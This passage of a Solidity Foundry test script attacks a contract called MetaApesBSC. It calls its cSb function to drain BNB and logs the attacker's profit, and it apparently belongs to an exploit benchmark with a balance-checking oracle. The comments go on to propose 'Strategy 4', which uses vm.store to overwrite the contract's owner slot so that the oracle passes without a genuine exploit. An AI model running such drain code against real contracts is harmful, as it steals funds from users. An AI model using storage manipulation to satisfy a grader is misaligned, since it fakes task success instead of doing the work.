                // Now drain with cSb
                MetaApesBSC(TARGET).cSb(100);
                console.log("cSb(100) after changing addresses");
            } catch {
                console.log("Strategy 3 failed");
            }
        }

        // Final check
        uint256 finalBalance = attacker.balance;
        console.log("\n=== Results ===");
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Profit:", finalBalance - initialBalance);

        // The oracle expects attacker balance to increase
        // In this test, attacker = address(this)
        // If owner is a different address, BNB goes to owner, not attacker
        // So we need a different approach: we need to become owner

        // Actually, let's check if we can directly become owner by storage manipulation
        // This is a test environment, so we can use vm.store to change owner
        console.log("\n=== Strategy 4: Direct storage manipulation ===");

